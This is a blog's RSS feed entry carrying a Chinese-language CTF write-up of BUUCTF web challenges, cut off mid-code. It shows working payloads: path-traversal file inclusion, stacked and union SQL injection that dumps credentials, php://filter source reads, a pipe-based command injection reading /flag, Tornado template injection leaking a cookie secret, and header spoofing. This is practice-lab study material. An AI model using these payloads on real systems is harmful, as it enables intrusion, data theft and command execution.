<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>BUUCTF_Web on Braindance</title><link>https://www.braindance.top/tags/buuctf_web/</link><description>Recent content in BUUCTF_Web on Braindance</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><lastBuildDate>Mon, 18 Jan 2021 16:58:56 +0000</lastBuildDate><atom:link href="https://www.braindance.top/tags/buuctf_web/index.xml" rel="self" type="application/rss+xml"/><item><title>BUUCTF寒假刷题-Web</title><link>https://www.braindance.top/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/</link><pubDate>Mon, 18 Jan 2021 16:58:56 +0000</pubDate><guid>https://www.braindance.top/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/</guid><description>&lt;p&gt;寒假横向刷题（尽量）
&lt;a class="link" href="https://buuoj.cn/challenges#" target="_blank" rel="noopener"
&gt;BUUCTF&lt;/a&gt;
💗🧡💛💚💙💜🤎🖤🤍
&lt;strong&gt;题都写这一个里面了，可以先用&lt;code&gt;Ctrl+F&lt;/code&gt;搜索，还有部分是草稿还没有整理，不过我认为的思路已经整理出来了，看不懂还请大伙见谅。有问题了很乐意效劳💨&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id="20210115"&gt;2021.01.15
&lt;/h1&gt;&lt;h1 id="hctf-2018warmup"&gt;[HCTF 2018]WarmUp
&lt;/h1&gt;&lt;p&gt;进到靶机一个硕大的滑稽，查看源码有提示source.php&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210120101413.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
highlight_file(__FILE__);
class emmm
{
public static function checkFile(&amp;amp;$page)
{
$whitelist = [&amp;#34;source&amp;#34;=&amp;gt;&amp;#34;source.php&amp;#34;,&amp;#34;hint&amp;#34;=&amp;gt;&amp;#34;hint.php&amp;#34;];
if (! isset($page) || !is_string($page)) {
echo &amp;#34;you can&amp;#39;t see it&amp;#34;;
return false;
}
if (in_array($page, $whitelist)) {
return true;
}
$_page = mb_substr(
$page,
0,
mb_strpos($page . &amp;#39;?&amp;#39;, &amp;#39;?&amp;#39;)
);
if (in_array($_page, $whitelist)) {
return true;
}
$_page = urldecode($page);
$_page = mb_substr(
$_page,
0,
mb_strpos($_page . &amp;#39;?&amp;#39;, &amp;#39;?&amp;#39;)
);
if (in_array($_page, $whitelist)) {
return true;
}
echo &amp;#34;you can&amp;#39;t see it&amp;#34;;
return false;
}
}
if (! empty($_REQUEST[&amp;#39;file&amp;#39;])
&amp;amp;&amp;amp; is_string($_REQUEST[&amp;#39;file&amp;#39;])
&amp;amp;&amp;amp; emmm::checkFile($_REQUEST[&amp;#39;file&amp;#39;])
) {
include $_REQUEST[&amp;#39;file&amp;#39;];
exit;
} else {
echo &amp;#34;&amp;lt;br&amp;gt;&amp;lt;img src=\&amp;#34;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&amp;#34; /&amp;gt;&amp;#34;;
}
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;发现白名单有source.php和hint.php，先去查看一下hint.php&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;flag not here, and flag in ffffllllaaaagggg&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;分析源码&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;判断&lt;code&gt;$_REQUEST['file']&lt;/code&gt;对象为空且为字符串&lt;/li&gt;
&lt;li&gt;执行emmm类中的&lt;strong&gt;checkFile&lt;/strong&gt;方法判断是否在白名单（确保函数返回是true）&lt;/li&gt;
&lt;li&gt;文件包含&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;checkFile函数中字符串截取判断是否在白名单（代码17-24和26-34）所以有两种绕过方法。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;第一种&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;file=hint.php?../../../../../ffffllllaaaagggg
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;字符串截取将原字符串尾部加上&lt;code&gt;?&lt;/code&gt;再截取第一个&lt;code&gt;?&lt;/code&gt;之前的内容。所以需要在构造payload时问号前需要是白名单里的文件。问号之后，猜测flag位置在根目录下，所以使用尽可能多的&lt;code&gt;../&lt;/code&gt;返回上级目录。&lt;/p&gt;
&lt;ol start="2"&gt;
&lt;li&gt;第二种&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;hint.php%3F..%2F..%2F..%2F..%2F..%2Fffffllllaaaagggg
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;将第一种payload使用urlencode编码即可。&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="强网杯-2019随便注"&gt;[强网杯 2019]随便注
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210120094248.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;根据题目尝试sql注入，单引号报错，单引号加注释无报错，说明存在sql注入，当测试输入select时返回过滤的黑名单：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;return preg_match(&amp;#34;/select|update|delete|drop|insert|where|\./i&amp;#34;,$inject);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这道题使用的是堆叠注入，原理&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为：（因未对输入的参数进行过滤）Select * from products where productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;查看数据库&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;1&amp;#39;;show databases;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210120095211.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;查看当前库下的表&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;1&amp;#39;;show tables;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210120095339.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;查看两张表字段&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;1&amp;#39;;show columns from words;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210120095607.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;还有一种查看表的语句，在windows系统下，反单引号（`）是数据库、表、索引、列和别名用的引用符&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;1&amp;#39;;desc `1919810931114514`;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210120095839.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;找到了flag在的字段，接下来就是如何获取该字段的值。顺带一提，根据表的结构，初步判断默认查询的是&lt;strong&gt;word&lt;/strong&gt;表中的字段，而flag在&lt;strong&gt;1919810931114514&lt;/strong&gt;表中。&lt;/p&gt;
&lt;p&gt;网上找到的两种方法，分别是修改表名和使用预处理语句。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;使用&lt;a class="link" href="https://www.cnblogs.com/geaozhang/p/9891338.html" target="_blank" rel="noopener"
&gt;预处理&lt;/a&gt;语句&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;因为select被过滤了，但是可以使用char函数，char() 函数将select的ASCII码转换为select字符串，接着利用concat()函数进行拼接得到select查询语句，从而绕过过滤。或者直接用concat()函数拼接select来绕过。&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;char(115,101,108,101,99,116)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;根据预处理语句格式构造payload&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;创建一个&lt;strong&gt;sqli&lt;/strong&gt;字符串值为查询sql语句，使用预处理语句赋值并执行。&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;1&amp;#39;;SET @sqli=concat(char(115,101,108,101,99,116),&amp;#39;* from `1919810931114514`&amp;#39;);PREPARE hacker from @sqli;EXECUTE hacker;#
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;不使用变量&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;1&amp;#39;;PREPARE sqli FROM CONCAT(&amp;#39;s&amp;#39;,&amp;#39;elect&amp;#39;,&amp;#39; * from `1919810931114514`&amp;#39;);EXECUTE sqli; #
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;还有一种&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;1&amp;#39;;SET @sqli = CONCAT(&amp;#39;s&amp;#39;,&amp;#39;e&amp;#39;,&amp;#39;l&amp;#39;,&amp;#39;e&amp;#39;,&amp;#39;c&amp;#39;,&amp;#39;t&amp;#39;,&amp;#39; * from `1919810931114514`&amp;#39;);PREPARE haha FROM@sqli ;EXECUTE haha; #
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;主要区别在于过滤的绕过方式，不要拘泥于一种方式。&lt;/p&gt;
&lt;ol start="2"&gt;
&lt;li&gt;修改表名&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;修改表名的思路是：默认查询的是&lt;strong&gt;word&lt;/strong&gt;表第一个字段，所以把&lt;strong&gt;word&lt;/strong&gt;表修改为其他名称，将flag所在的&lt;strong&gt;1919810931114514&lt;/strong&gt;表名修改为&lt;strong&gt;word&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;网上payload&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;0&amp;#39;;rename table words to words1;rename table `1919810931114514` to words;alter table words change flag id varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;desc words;#
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;自己构造的payload&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;0&amp;#39;;rename table words to words1;rename table `1919810931114514` to words;alter table words change flag id varchar(100) #
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;之后执行&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;1&amp;#39; or 1=1 #
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;查询表所有字段值即可。&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="极客大挑战-2019easysql"&gt;[极客大挑战 2019]EasySQL
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210120101528.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;用户名密码，尝试万能密码。&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;#39;or 1=1 #
随便密码
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;一个万能密码的参考:https://www.cnblogs.com/pass-A/p/11134988.html&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="极客大挑战-2019havefun"&gt;[极客大挑战 2019]Havefun
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210120101733.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;直接源码找到php代码。payload&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;?cat=dog
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h1 id="suctf-2019easysql"&gt;[SUCTF 2019]EasySQL
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210120102317.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;单引号无报错，尝试堆叠注入可以回显。&lt;/p&gt;
&lt;p&gt;和 [强网杯 2019]随便注这道题一样查库查表查字段&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;1;show databases;
1;show tables;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;但是执行&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;1;desc `Flag`;
1;show columns from Flag;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;返回了&amp;quot;Nonono.“测试出被过滤了：desc、from、Flag。&lt;/p&gt;
&lt;p&gt;接下来的都是抄网上的预期解也是第一次见。&lt;/p&gt;
&lt;p&gt;比赛时源码泄露&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;select $_GET[&amp;#39;query&amp;#39;] || flag from flag
&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
&lt;p&gt;在oracle 缺省支持 通过 ‘ || ’ 来实现字符串拼接，但在mysql 缺省不支持。需要调整mysql 的sql_mode
模式：pipes_as_concat 来实现oracle 的一些功能&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;payload&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;1;set sql_mode=PIPES_AS_CONCAT;select 1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;非预期解&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;*,1
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h1 id="actf2020-新生赛include"&gt;[ACTF2020 新生赛]Include
&lt;/h1&gt;&lt;p&gt;不截图了，进入靶机只有一个&lt;strong&gt;tips&lt;/strong&gt;等着被点。跳转以后看url中参数&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;?file=flag.php
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;页面内容只有&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Can you find out the flag?&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;立马想到使用php伪协议读文件内容。使用filter过滤器&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;?file=php://filter/convert.base64-encode/resource=flag.php
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;得到&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7OTAyNTIyNDgtMjY3NC00NDdjLWFlYWMtYjc3ZTc5YjYwMzVmfQo=
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;解密得到flag&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="极客大挑战-2019secret-file"&gt;[极客大挑战 2019]Secret File
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210120103724.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;查看源码，又一个背景是黑色的超链接跳转到 Archive_room.php。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210120103842.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;查看源码SECRET跳转的是action.php。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210120103907.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;但是跳转以后是url地址为end.php，所以中间跳过了一个页面，使用bp抓包查看。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210120104246.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;stristr()函数返回字符串中子串第一次出现位置之后的内容，简而言之还是过滤。&lt;/p&gt;
&lt;p&gt;同样使用php伪协议filter过滤器读取文件&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;?file=php://filter/convert.base64-encode/resource=flag.php
&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex="0"&gt;&lt;code&gt;PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KCiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICAgICAgPHRpdGxlPkZMQUc8L3RpdGxlPgogICAgPC9oZWFkPgoKICAgIDxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOmJsYWNrOyI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPGgxIHN0eWxlPSJmb250LWZhbWlseTp2ZXJkYW5hO2NvbG9yOnJlZDt0ZXh0LWFsaWduOmNlbnRlcjsiPuWViuWTiO+8geS9oOaJvuWIsOaIkeS6hu+8geWPr+aYr+S9oOeci+S4jeWIsOaIkVFBUX5+fjwvaDE+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPgogICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgZWNobyAi5oiR5bCx5Zyo6L+Z6YeMIjsKICAgICAgICAgICAgICAgICRmbGFnID0gJ2ZsYWd7ZmZjZTAwNWYtYjEyOS00YWM1LTg3MzYtZDM3YzUwYjYxNjZkfSc7CiAgICAgICAgICAgICAgICAkc2VjcmV0ID0gJ2ppQW5nX0x1eXVhbl93NG50c19hX2cxcklmcmkzbmQnCiAgICAgICAgICAgID8+CiAgICAgICAgPC9wPgogICAgPC9ib2R5PgoKPC9odG1sPgo=
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;解密得到网页源码，flag在其中。&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="极客大挑战-2019lovesql"&gt;[极客大挑战 2019]LoveSQL
&lt;/h1&gt;&lt;p&gt;顶端の告诫：用 sqlmap 是没有灵魂的&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210120104703.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;尝试万能密码（其实没卵用）&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;#39;or 1=1 #
任意密码
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这道题是常规的sql注入，测注入点、查字段数、爆库、爆字段值、爆表。组合拳&lt;/p&gt;
&lt;p&gt;字段数：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;1&amp;#39; order by 3 #
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;爆库：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;1&amp;#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() #
geekuser,l0ve1ysq1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;爆字段值：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;1&amp;#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&amp;#39;l0ve1ysq1&amp;#39; #
id,username,password
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;爆表：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;1&amp;#39; union select 1,2,group_concat(id,username,password) from l0ve1ysq1 #
&amp;#39;1cl4ywo_tai_nan_le,2glzjinglzjin_wants_a_girlfriend,3Z4cHAr7zCrbiao_ge_dddd_hm,40xC4m3llinux_chuang_shi_ren,5Ayraina_rua_rain,6Akkoyan_shi_fu_de_mao_bo_he,7fouc5cl4y,8fouc5di_2_kuai_fu_ji,9fouc5di_3_kuai_fu_ji,10fouc5di_4_kuai_fu_ji,11fouc5di_5_kuai_fu_ji,12fouc5di_6_kuai_fu_ji,13fouc5di_7_kuai_fu_ji,14fouc5di_8_kuai_fu_ji,15leixiaoSyc_san_da_hacker,16flagflag{c4e8849c-e0e3-4e0d-b701-26a5abeec46a}&amp;#39;
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h1 id="20210121"&gt;2021.01.21
&lt;/h1&gt;&lt;h1 id="gxyctf2019ping-ping-ping"&gt;[GXYCTF2019]Ping Ping Ping
&lt;/h1&gt;&lt;p&gt;&lt;a class="link" href="https://braindance.tk/2020/%5BGXYCTF2019%5DPing%20Ping%20Ping/" target="_blank" rel="noopener"
&gt;传送门&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="actf2020-新生赛exec"&gt;[ACTF2020 新生赛]Exec
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210121090002.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;肯定是尝试管道符&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;127.0.0.1|cat /flag
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h1 id="护网杯-2018easy_tornado"&gt;[护网杯 2018]easy_tornado
&lt;/h1&gt;&lt;p&gt;打开页面三个超链接&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;/flag.txt&lt;/p&gt;
&lt;p&gt;/welcome.txt&lt;/p&gt;
&lt;p&gt;hints.txt&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;内容分别是&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;flag in /fllllllllllllag&lt;/p&gt;
&lt;p&gt;render&lt;/p&gt;
&lt;p&gt;md5(cookie_secret+md5(filename))&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;进入hints.txt注意到url地址此时为&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;/file?filename=/hints.txt&amp;amp;filehash=2a84a09bc1d5e3d8745131754ff208fa
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;再根据hints.txt文件的内容，推断可以使用url方式访问文件，但是需要提供&lt;strong&gt;filehash&lt;/strong&gt;值，加密的方法即hints.txt的内容：md5(cookie_secret+md5(filename))。flag文件的名称&lt;code&gt;filename&lt;/code&gt;有了，接下来就是获取&lt;code&gt;cookie_secret&lt;/code&gt;的值。&lt;/p&gt;
&lt;p&gt;接下来触及到盲区了，获取cookie_secret是看wp。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页 render配合Tornado使用&lt;/p&gt;&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;在tornado模板中，存在一些可以访问的快速对象,这里用到的是handler.settings，handler 指向RequestHandler，而RequestHandler.settings又指向self.application.settings，所以handler.settings就指向RequestHandler.application.settings了，这里面就是我们的一些环境变量&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;获取cookie_secret的payload&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;/error?msg={{handler.settings}}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210121091616.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;获得cookie_secret的值为&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;eb326d39-cd67-47bd-b2d3-71125996417b
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;根据hints.txt的url验证一下是如何加密的。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210121092122.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;选中的蓝色部分是&lt;code&gt;/hints.txt&lt;/code&gt;加密后的md5值。推断出filehash格式以后直接访问flag文件，payload：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;/file?filename=/hints.txt&amp;amp;filehash=2a84a09bc1d5e3d8745131754ff208fa
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h1 id="极客大挑战-2019knife"&gt;[极客大挑战 2019]Knife
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210121092431.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;一句话直接连。&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="roarctf-2019easy-calc"&gt;[RoarCTF 2019]Easy Calc
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210121092956.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;一个计算器随便试一试，当输入字母时会报错。查看网页源码，在script中发现了运行计算器的php文件：&lt;strong&gt;calc.php&lt;/strong&gt;，但是也有一句很重要的注释&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;!--I&amp;#39;ve set up WAF to ensure security.--&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210121093233.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;php的正则表达式中并没有过滤字母的条件，所以我们输入字母被过滤是因为&lt;strong&gt;WAF&lt;/strong&gt;，接下来是参考网上的wp自己的理解&lt;/p&gt;
&lt;p&gt;可以在calc.php传参&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;? num=a
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;php会输出一个值a，说明已经绕过了WAF。这里使用的是WAF和php解析方法不一样，WAF解析到空格&amp;rsquo; &amp;lsquo;会直接过滤掉，这样WAF认为传入的就是一个空值，并不会识别num，但是php解析的时候会把空格去掉，这样就能get到num的值。&lt;/p&gt;
&lt;p&gt;接下来绕过正则就可以使用char()的方式使用ascii码转。空格被过滤但是想使用php输出可以使用var_dump()&lt;/p&gt;
&lt;p&gt;查看根目录下文件，可以使用scandir（）遍历文件夹，其中char（47）&amp;mdash;&amp;mdash;&amp;gt; &amp;lsquo;/&amp;rsquo; ：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;? num=1;var_dump(scandir(chr(47)))
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;找到了疑似flag文件：f1agg，使用file_get_contents（）读取文件&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;?%20num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h1 id="极客大挑战-2019http"&gt;[极客大挑战 2019]Http
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210121104213.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;查看源码在&amp;quot;氛围&amp;quot;这两个字上有隐藏的跳转Secret.php。进入以后页面显示&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;It doesn&amp;#39;t come from &amp;#39;https://www.Sycsecret.com&amp;#39;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;提示页面不是来自这个网址，所以在HackBar上加上Referer。之后又提示&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;Please use &amp;#34;Syclover&amp;#34; browser
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;加上User-Agent。提示&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;No!!! you can only read this locally!!!
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;加上X-Forwarded-For。&lt;a class="link" href="https://www.runoob.com/w3cnote/http-x-forwarded-for.html" target="_blank" rel="noopener"
&gt;HTTP X-Forwarded-For 介绍&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;最终的请求头：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;GET /Secret.php HTTP/1.1
Host: node3.buuoj.cn:26715
Upgrade-Insecure-Requests: 1
User-Agent: Syclover
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
x-forwarded-for: 127.0.0.1
referer: https://www.Sycsecret.com
Connection: close
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h1 id="极客大挑战-2019php"&gt;[极客大挑战 2019]PHP
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210121105104.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;源码备份在&lt;code&gt;www.zip&lt;/code&gt;中。下载以后有五个文件&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;class.php&lt;/p&gt;
&lt;p&gt;flag.php&lt;/p&gt;
&lt;p&gt;index.js&lt;/p&gt;
&lt;p&gt;index.php&lt;/p&gt;
&lt;p&gt;style.css&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;在index.php中有一段代码&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
